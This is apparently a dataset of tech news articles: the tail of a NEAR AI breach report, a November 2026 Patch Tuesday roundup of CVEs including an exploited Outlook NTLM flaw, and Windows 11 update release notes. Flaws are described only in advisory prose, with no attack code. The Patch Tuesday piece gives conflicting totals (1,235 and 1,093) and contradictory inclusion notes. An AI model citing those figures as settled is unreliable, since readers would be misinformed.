The attacker could also have seen requests being processed on that server that day, including requests sent in confidential mode, the company said earlier this week. That mode processes requests inside a trusted execution environment (TEE) designed to keep them private even from the company itself.

But the TEE "does not protect against a vulnerability in the software running inside the environment," the company said. SGLang runs inside the TEE, which is how the attacker could reach requests there.

That access has since been closed, but not before the attacker moved further into the company's systems.

The attacker reached an internal system behind Private Chat, a product the company had already deprecated. So far, the company has confirmed that the attacker downloaded account details for about 100 users there. These are email addresses and names, and for some accounts, plan and balance information.

The company found no sign that stored Private Chat conversations or uploaded files were accessed.

The attacker also reached 18 AI agents on an older deployment of NEAR AI Agents that did not run inside the company's TEE. From those agents, the attacker took data including chat history, settings and logs.

Two customers' NEAR AI Cloud API keys were exposed in logs. The company has revoked both.

After detecting the attack, the company revoked all active sessions and administrator credentials, replaced all agent tokens and took Private Chat offline. It also deployed a fix for the SGLang flaw on all of its inference servers, rotated its remaining credentials and completed a full forensic review, according to its incident report.

Access to its NEAR AI Cloud service has been restored. The company reported the flaw to the SGLang project. It has not identified the flaw by CVE number, named the affected SGLang versions, or said whether the project has released a fix.

The company has contacted users whose account details or agents it confirmed were accessed. Affected users heard directly from security@near.ai, with the steps that apply to them. As a precaution, the company asks users to be careful with messages about their account or balance that they did not ask for.

In a follow-up post yesterday, it said users who have not heard from it do not need to do anything. It has not said whether people whose requests passed through the affected server last Sunday were among those contacted.

In an October 15 technical write-up, Brave, the browser maker, said its Leo assistant runs chats with the GLM 5.3 Flash model inside a TEE operated by NEAR AI.

NEAR AI has not said whether the affected server handled any of those chats.

articles.title: Microsoft November 2026 Patch Tuesday fixes 1,235 flaws, Outlook zero-day
articles.context: Today is Microsoft's November 2026 Patch Tuesday, with security updates addressing a record-breaking 1,235 flaws, including one actively exploited Microsoft Outlook zero-day vulnerability. [...]
articles.full_text:
Today is Microsoft's November 2026 Patch Tuesday, with security updates addressing a record-breaking 1,235 flaws, including one actively exploited Microsoft Outlook zero-day vulnerability.

This Patch Tuesday addresses 66 "Critical" vulnerabilities, 48 of which are Remote Code Execution (RCE), 15 are Elevation of Privilege (EoP), and three are Use-After-Free in Microsoft Edge.

The approximate number of bugs in each vulnerability category is listed below:

536 Elevation of Privilege Vulnerabilities

27 Security Feature Bypass Vulnerabilities

296 Remote Code Execution Vulnerabilities

157 Information Disclosure Vulnerabilities

46 Denial of Service Vulnerabilities

22 Spoofing Vulnerabilities

142 Microsoft Edge (Chromium-based) Vulnerabilities

Of the 1,235 vulnerabilities, approximately 639 are categorized under Windows or Microsoft Windows products/components.

When BleepingComputer reports on Patch Tuesday security updates, we only count vulnerabilities released by Microsoft on Patch Tuesday itself.

Therefore, today's total excludes 108 flaws fixed earlier this month, including one Entra Device Registration, 82 Mariner, and 25 Microsoft Edge flaws.

November's Patch Tuesday comes after a record-breaking 1,411 flaws in the October updates as Microsoft continues to use AI to find and patch vulnerabilities.

To learn more about the non-security updates released today, you can review our dedicated articles on the Windows 11 KB5132061 & KB5131087 cumulative updates and the Microsoft Windows 10 KB5131096 extended security update.

Microsoft patches 1 zero-days

This month's Patch Tuesday fixes one zero-day vulnerability in Microsoft Outlook that was exploited in attacks.

Microsoft classifies a zero-day flaw as publicly disclosed or actively exploited when no official fix is available.

The actively exploited zero-day vulnerability addressed in the November 2026 Patch Tuesday updates is:

CVE-2026-124194 - Microsoft Outlook Spoofing Vulnerability

Microsoft patched a Microsoft Outlook Spoofing zero-day vulnerability that was actively exploited in attacks to steal NTLM account hashes.

"An unauthenticated attacker could send a specially crafted message file and convince a user to open it in an affected version of Microsoft Outlook," warns Microsoft.

"Opening the file could cause Outlook to connect to an attacker-controlled network location without displaying the usual external-content warning, potentially disclosing authentication information that could be used to impersonate the user. Exploitation requires network connectivity and user interaction."

This type of vulnerability is known as an NTLM credential disclosure flaw, where a malicious attachment, when opened, causes Windows to connect to an attacker-controlled network share.

When connecting, Windows may automatically attempt to authenticate to the remote server, exposing the user's NTLMv2 authentication hash, which can then be captured by the attacker and potentially cracked offline.

The recovered credentials could then be used to gain unauthorized access to corporate accounts.

Similar vulnerability have been exploited in the past, typically through malicious attachments sent in phishing campaigns.

Recent updates from other companies

Other vendors who released updates or advisories in November 2026 include:

Barracuda Networks released security updates for two vulnerabilities that can let attackers run commands with root privileges. A week later, these flaws were exploited in attacks.

Cisco released security updates for numerous products, including critical vulnerabilities Catalyst SD-WAN Controller, Secure Email Gateway, and Meraki.

Google released emergency security updates to patch a new Chrome vulnerability exploited in zero-day attacks.

Ivanti released security updates to patch two Connect Secure (ICS) remote access gateway flaws that have been chained in zero-day attacks since at least October 1.

N-able is working on a hotfix for an alleged 30+ zero-days that were publicly disclosed yesterday, causing the company to take its hosted N-central environments offline.

Linux distributions released security updates to fix an authentication bypass flaw involving OpenSSH and musl, dubbed "*sshole".

SAP released the November security updates, which include fixes for four maximum-severity vulnerabilities.

SonicWall released security updates for seven vulnerabilities in SonicOS firewalls, including an SSL-VPN authentication bypass flaw exploited in attacks.

Vates released security updates for a critical authentication bypass vulnerability in Xen Orchestra is being actively exploited in attacks.

Zyxel patched a zero-day vulnerability in its GS1900 series network switches that was exploited to compromise nearly 1,000 devices worldwide.

The November 2026 Patch Tuesday Security Updates

Below is the complete list of resolved vulnerabilities in the November 2026 updates. Note, this report does include the flaws fixed earlier this month.

To access the full description of each vulnerability and the systems it affects, you can view the full report here.

Microsoft addresses 1093 CVEs in the eleventh Patch Tuesday of 2026.

Microsoft patched 1093 CVEs in its November 2026 Patch Tuesday release, with 63 rated critical, 1029 rated as important, and one rated as moderate.

This month’s update includes patches for 287 products and components. The following table lists the products with the most CVEs patched this month. A full list of patched products is available in the appendix.

Elevation of Privilege (EoP) vulnerabilities accounted for 48.9% of the vulnerabilities patched this month, followed by remote code execution (RCE) vulnerabilities at 27.1%.

Moderate

CVE-2026-124194 | Microsoft Outlook spoofing vulnerability

CVE-2026-124194 is a spoofing vulnerability in Microsoft Outlook. It received a CVSSv3 score of 6.5 and is rated moderate. An attacker could exploit this vulnerability by convincing a target to open a crafted Microsoft Office file. Successful exploitation would allow an attacker to obtain the target’s valid NTLMv2 hash, which can then be used to impersonate that user in follow-on attacks.

According to Microsoft, this vulnerability was exploited in the wild as a zero-day. Additionally, the advisory credits this discovery to a security researcher that used Claude, the large language model (LLM) from Anthropic, though no specific version of Claude was noted in the advisory.

Critical

CVE-2026-118146 | Windows Active Directory Domain Services remote code execution vulnerability

CVE-2026-118146 is an RCE vulnerability affecting Windows Active Directory Domain Services. It received a CVSSv3 score of 8.8 and is rated as critical. An authenticated attacker could exploit an incorrect authorization in Active Directory Domain Services to execute code over a network. Successful exploitation would allow an attacker to execute arbitrary code on the affected system. It was assessed as “Exploitation More Likely.”

Important

CVE-2026-120002 | Microsoft SharePoint Server elevation of privilege vulnerability

CVE-2026-120002 is an EoP vulnerability affecting Microsoft SharePoint Server. It received a CVSSv3 score of 9.9 and is rated as important. An authenticated attacker could exploit an incorrect authorization in Microsoft Office SharePoint to elevate privileges over a network. Successful exploitation would allow an attacker to gain elevated privileges. It was assessed as “Exploitation Less Likely.”

Critical

CVE-2026-118207 | Microsoft Exchange Server remote code execution vulnerability

CVE-2026-118207 is an RCE vulnerability affecting Microsoft Exchange Server. It received a CVSSv3 score of 8.8 and is rated as critical. An authenticated attacker could send malformed input to Microsoft Exchange Server, causing code to execute over a network. Successful exploitation would allow an attacker to execute arbitrary code on the affected system. It was assessed as “Exploitation More Likely.”

Critical

CVE-2026-119952 | Windows Schannel remote code execution vulnerability

CVE-2026-119952 is an RCE vulnerability affecting Windows Schannel. It received a CVSSv3 score of 8.1 and is rated as critical. An unauthenticated attacker could exploit an observable timing discrepancy in Windows Schannel to execute code over a network. Successful exploitation would allow an attacker to execute arbitrary code on the affected system. It was assessed as “Exploitation More Likely.”

articles.title: Windows 11 KB5132061 & KB5131087 cumulative updates released
articles.context: Microsoft has released the Patch Tuesday Windows 11 KB513261 and KB5131087 cumulative updates for versions 26H2/25H2/24H2 and 23H2 to fix security vulnerabilities and bugs and...
articles.full_text:
Microsoft has released the Patch Tuesday Windows 11 KB513261 and KB5131087 cumulative updates for versions 26H2/25H2/24H2 and 23H2 to fix security vulnerabilities and bugs and add new features.

Today's updates are mandatory as they contain the November 2026 Patch Tuesday security patches for hundreds of vulnerabilities discovered in previous months.

You can install today's update by going to Start > Settings > Windows Update and clicking on 'Check for Updates.'

You can also manually download and install the update from the Microsoft Update Catalog.

This is the eleventh 'Patch Tuesday' release in 2026, and it's based on 24H2, which means 25H2 or 26H2 get the same update. There are no exclusive or special changes. You'll get the same fixes across the two versions of Windows 11.

What's new in the November 2026 Patch Tuesday update

With today's update, Microsoft is adding new customization options to Windows 11 and fixing minor issues with File Explorer.

Here's the full list of improvements and fixes:

[Context menu in File Explorer]

New! This update introduces an updated context menu that is faster, simpler, and more customizable. The updated menu opens more quickly, reduces clutter, and gives you more control over the commands and app extensions that appear when you right-click.

You can now customize the context menu to better fit how you use Windows. Select Customize menu at the bottom of the context menu to open its Settings page.

Turn built-in Windows commands, such as Send to and Create shortcut, on or off.

Add commands such as Print to the context menu.

Choose which app extensions appear in the main menu or a submenu or hide the app extensions submenu.

Display Cut, Copy, Paste, Rename, Delete, and Share directly in the menu instead of as a row of icons.

Move Properties to the bottom of the context menu.

To personalize the context menu, right-click and select Customize menu, then choose the commands, app extensions, and layout you prefer. No action is required to use the default configuration. To see more options, hold down Shift and right-click on your desktop.

[Modernized AutoPlay experience]

New! This update modernizes the AutoPlay dialog that appears when you connect devices such as a phone, camera, or removable drive to your PC. The updated experience supports dark mode, responds better to text scaling and display settings, and makes AutoPlay notifications available in notification center for easier access.

[File Explorer]

New! Key file information, such as name, location, and date, now appear in a consistent layout on the File Explorer search results page, making search results easier to scan.

New! Address bar now supports ~, making it quicker to navigate directly to your user profile folder and subfolders (for example, ~\AppData).

New! This update enables dark mode support in the Folder Options dialog in File Explorer.

[XBOX mode]

New! This update introduces a refreshed Gaming Task View experience in XBOX mode, featuring a new navigation bar that provides quick access to Exit to Desktop and Power Options, making key system actions easier to access while gaming. 1

[Settings]

New! This update improves the Privacy & security page in Windows Settings by grouping related Camera, Microphone, and Location privacy controls and elevating usage information from linked pages onto the main page.

New! The Device Info card on the Settings Home page, first introduced in the March 2026 preview update KB5079391, is expanding to additional markets. Available to users signed in with a Microsoft account, the card provides a quick view of key PC specifications and usage, with more detailed device information available under Settings > System > About. 1

This update makes some small visual refinements to the design of the temporary files section under Settings > System > Storage.

[Phone Link]

New! You can now hover over a recent message or notification in the Recent section to preview its content directly in Start without opening the item. This experience can be managed under Phone Link > Settings > Start menu personalization.

[Taskbar]

New! The update improves animations of app window previews when mousing across app icons in the taskbar.

This update improves the underlying state persistence of taskbar settings related to multiple monitors across monitor connections and disconnections.

[Magnifier]

New! Magnifier now includes a contrast theme toggle that can reduce screen glare while keeping the original colors in photos, videos, and charts. The toggle applies a dark contrast theme by default and is available from the Magnifier toolbar. To choose a different contrast theme, go to Settings > Accessibility > Magnifier. Color inversion remains available as a separate option.

New! Magnifier now supports per-monitor zoom, allowing each display to use its own zoom level while keeping the magnified view within that display. To use per-monitor zoom, set your displays to Extend under Settings > System > Display.

To adjust a display, move your pointer to it and press Windows key + Plus (+) or Windows key + Minus (-), use Ctrl + Alt with the mouse wheel or move the Magnifier toolbar to that display and use its controls.

Per-monitor zoom is on by default. You can turn it off or adjust individual zoom levels from the Magnifier toolbar or under Settings > Accessibility > Magnifier.

New! Magnifier now supports viewport locking for multi-monitor setups with per-monitor zoom turned on. It keeps the magnified view on a display in place while you move the pointer to another display. The locked display remains interactive. Point to a display and press Ctrl + Windows key + K to lock or unlock its view.

Press Windows key + Esc to release all locked displays.

You can change the lock shortcut to Ctrl + Alt + P under Settings > Accessibility > Magnifier.

[Live Captions]

New! This update improves Live Captions with a new Include screen reader audio setting, which is off by default. With the setting off, Live Captions will not transcribe audio from screen readers such as Narrator, JAWS, and NVDA, keeping captions focused on microphone and system audio. To turn on this setting, go to Settings > Accessibility > Captions.

[Narrator]

New! Narrator now supports reading and navigating math equations in supported Microsoft 365 apps, including Word and PowerPoint, and supported web content in Microsoft Edge (version 153.0.4234.32 and later) and Google Chrome (version 153.0.8010.18 and later). This makes it easier for users who are blind or have low vision to understand and explore equations, formulas, and scientific notation.

Press Narrator key + Alt + N to turn on math navigation and use the arrow keys to explore parts of an equation. Press Esc to exit.

Math reading supports English (United States), English (United Kingdom), Traditional Chinese, Finnish, German, and Spanish. You can change the language and other math reading preferences in Narrator settings (Accessibility > Narrator > Math reading).

[Family Safety]

New! The update improves family safety messaging when applications are blocked because of age-restricted parental controls.

[Recovery]

New! This update enables Windows recovery (WinRE) to automatically reuse eligible Wi-Fi profiles already saved in Windows, including supported certificate-based networks. Devices can now get online automatically during recovery scenarios such as quick machine recovery or cloud rebuild, without preconfiguring Wi-Fi credentials in WinRE. This capability is on by default, and IT admins can disable it. This feature was previously disclosed last month and is now beginning to roll out.

To learn more, see Networking in WinRE.

[Cloud rebuild]

New! This update introduces Cloud rebuild, a new recovery option that reinstalls Windows 11 using a Windows image and device drivers downloaded from Windows Update, including when Windows is unable to start. No USB media or custom image is required. Cloud rebuild includes:

Drive sanitization: Choose to remove your files or securely erase data using the storage hardware’s erase capability before Windows is reinstalled. Sanitization is irreversible.

Remote management: IT administrators can configure and start a Cloud rebuild remotely through the Recovery CSP using either the currently installed build or a specified target build.

To start Cloud rebuild:

In Windows, go to Settings > System > Recovery, and then select Rebuild PC. The device restarts into the Windows Recovery Environment and starts Cloud rebuild.

Alternatively, if Windows can't start, the device enters the Windows Recovery Environment automatically after repeated boot failures. From the Windows Recovery Environment (WinRE), select Troubleshoot > Recovery and uninstall > Cloud rebuild.

Connect to a wired Ethernet or Wi-Fi network.

Review the target Windows build, edition, and language, and then confirm the data loss warning before the rebuild begins. You can choose whether to remove files or remove and sanitize files prior to Windows reinstalling.

To learn more, see Cloud rebuild.

[Windows settings backup and restore]

New! This update introduces a Restore Summary that appears after you restore a backup profile to a new device. The summary gives a clear overview of what was successfully restored, including Windows settings and the list of Microsoft Store apps. This improves transparency during device transitions and helps you validate your restore results and continue setup on your new device with confidence.

For more information see, Windows settings backup and restore overview.

[Adaptive hibernate policy]

New! This update improves the adaptive hibernate policy to provide more instant-on resumes from Modern Standby while helping preserve battery life when the charge is low. Noticeable changes include less hibernation while the battery is above 80% and hibernating sooner when the battery is below 10%.

[Security]

New! This update expands memory integrity protection across eligible devices. Supported PCs may now have memory integrity (HVCI) enabled during updates to help improve security and prepare devices for advanced Windows security features, while respecting existing user or IT administrator choices. For more information, see Expanding memory integrity protection across Windows devices.

[Windows IPv6 networking support]

New! Windows now supports IPv6 CLAT for Wi-Fi and Ethernet network interfaces, adding client-side 464XLAT translation so IPv4-only applications can continue reaching IPv4 services from IPv6-only networks. This helps organizations advance IPv6-only deployments while preserving compatibility for legacy IPv4 application scenarios.

Prefix discovery: PREF64 is discovered through Router Advertisements (RA) by default, with DNS ipv4only.arpa available as a fallback.

Requirements: CLAT requires SLAAC-based IPv6 addressing. DHCPv6 Prefix Delegation and Windows Subsystem for Linux (WSL) are not currently supported.

Configuration: Enable CLAT by using netsh interface clat set global permit=enabled pref64fromdns=enabled pref64fromra=enabled or Group Policy under Network > TCPIP Settings > IPv6 Transition Technologies.

[Data Protection API (DPAPI)]

New! This update adds a warning before prompt-based protect and unprotect operations. The warning explains that this prompt-based experience will be retired in April 2027. If you or an app use these prompts, stop creating new prompt-protected data, use a supported non-interactive protection flow, and decrypt or migrate existing prompt-protected data before retirement. DPAPI operations that do not use the prompt-based flow aren't affected. For more details, see CRYPTPROTECT_PROMPTSTRUCT structure (dpapi.h).

[Windows Spotlight]

This update makes underlying platform changes to generally improve Windows Spotlight reliability on the lock screen.

[Unicode]

This update provides Windows text shaping support for Unicode 17.0, helping Windows correctly display and shape newly encoded characters and scripts. Unicode 17.0 added 4,803 characters, including support for four newly encoded scripts: Beria Erfe, Sidetic, Tai Yo, and Tolong Siki. These updates help keep Windows text support current as the Unicode Standard evolves and improve support for languages and writing systems used by people around the world.

Microsoft is not aware of any new issues with this month's Patch Tuesday, and it also patched a long-standing issue that broke USB audio on some PCs.
